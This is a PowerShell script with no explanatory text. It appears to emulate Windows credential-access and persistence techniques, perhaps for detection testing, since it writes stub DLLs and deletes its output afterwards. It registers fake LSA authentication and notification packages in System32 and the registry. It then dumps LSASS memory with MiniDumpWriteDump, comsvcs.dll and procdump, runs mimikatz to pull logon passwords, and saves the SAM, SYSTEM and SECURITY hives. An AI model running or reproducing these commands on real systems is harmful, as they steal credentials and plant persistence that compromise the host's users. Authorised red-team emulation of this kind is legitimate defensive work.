$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"

$current = @("msv1_0")
try { $current = (Get-ItemProperty -Path $lsaKey -Name "Authentication Packages" -ErrorAction Stop)."Authentication Packages" } catch {}

foreach ($dll in @("evilauth", "mimitoken", "pwgrab")) {
    $malDll = "$env:SYSTEMROOT\System32\${dll}.dll"
    $peStub = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 2044)
    try { [System.IO.File]::WriteAllBytes($malDll, $peStub) } catch {}
    try {
        $pkgs = (Get-ItemProperty -Path $lsaKey -Name "Authentication Packages" -ErrorAction Stop)."Authentication Packages"
        Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value (@($pkgs) + @($dll)) -ErrorAction Stop
    } catch {}
    Remove-Item $malDll -Force -ErrorAction SilentlyContinue
}

$notifCurrent = @("scecli")
try { $notifCurrent = (Get-ItemProperty -Path $lsaKey -Name "Notification Packages" -ErrorAction Stop)."Notification Packages" } catch {}
foreach ($pf in @("evilpwfilter", "credlogger", "passnotify")) {
    try {
        $pkgs = (Get-ItemProperty -Path $lsaKey -Name "Notification Packages" -ErrorAction Stop)."Notification Packages"
        Set-ItemProperty -Path $lsaKey -Name "Notification Packages" -Value (@($pkgs) + @($pf)) -ErrorAction Stop
    } catch {}
}

if (-not ('LsaLoader' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsaLoader {
        [DllImport("secur32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern int AddSecurityPackage(string name, IntPtr opts);
        [DllImport("secur32.dll", CharSet=CharSet.Unicode)]
        public static extern int DeleteSecurityPackage(string name);
    }
'@
}

foreach ($pkg in @("evilauth", "mimitoken", "pwgrab")) {
    [LsaLoader]::AddSecurityPackage($pkg, [IntPtr]::Zero) | Out-Null
}

if (-not ('LsassOpen' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsassOpen {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
        [DllImport("dbghelp.dll", SetLastError=true)]
        public static extern bool MiniDumpWriteDump(IntPtr hProcess, int pid, IntPtr hFile, int dumpType, IntPtr exceptParam, IntPtr userStream, IntPtr callback);
        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern IntPtr CreateFile(string f, int a, int s, IntPtr sa, int d, int fl, IntPtr t);
    }
'@
}

$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
if ($lsass) {
    $h = [LsassOpen]::OpenProcess(0x1FFFFF, $false, $lsass.Id)
    if ($h -ne [IntPtr]::Zero) {
        $dumpPath = "$env:TEMP\lsass_dump.dmp"
        $fh = [LsassOpen]::CreateFile($dumpPath, 0x40000000, 0, [IntPtr]::Zero, 2, 0, [IntPtr]::Zero)
        if ($fh -ne [IntPtr]::new(-1)) {
            [LsassOpen]::MiniDumpWriteDump($h, $lsass.Id, $fh, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
            [LsassOpen]::CloseHandle($fh) | Out-Null
        }
        [LsassOpen]::CloseHandle($h) | Out-Null
        Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue
    }

    $h2 = [LsassOpen]::OpenProcess(0x0410, $false, $lsass.Id)
    if ($h2 -ne [IntPtr]::Zero) { [LsassOpen]::CloseHandle($h2) | Out-Null }
}

& rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass -ErrorAction SilentlyContinue).Id "$env:TEMP\lsass2.dmp" full 2>&1 | Out-Null
Remove-Item "$env:TEMP\lsass2.dmp" -Force -ErrorAction SilentlyContinue

Start-Process "procdump.exe" -ArgumentList "-accepteula","-ma","lsass.exe","$env:TEMP\lsass3.dmp" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process "mimikatz.exe" -ArgumentList "`"sekurlsa::logonpasswords`"","exit" -NoNewWindow -ErrorAction SilentlyContinue

& reg.exe save HKLM\SAM "$env:TEMP\sam.hiv" /y 2>&1 | Out-Null
& reg.exe save HKLM\SYSTEM "$env:TEMP\system.hiv" /y 2>&1 | Out-Null
& reg.exe save HKLM\SECURITY "$env:TEMP\security.hiv" /y 2>&1 | Out-Null
Remove-Item "$env:TEMP\sam.hiv","$env:TEMP\system.hiv","$env:TEMP\security.hiv" -Force -ErrorAction SilentlyContinue

try { Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value $current -ErrorAction Stop } catch {}
try { Set-ItemProperty -Path $lsaKey -Name "Notification Packages" -Value $notifCurrent -ErrorAction Stop } catch {}
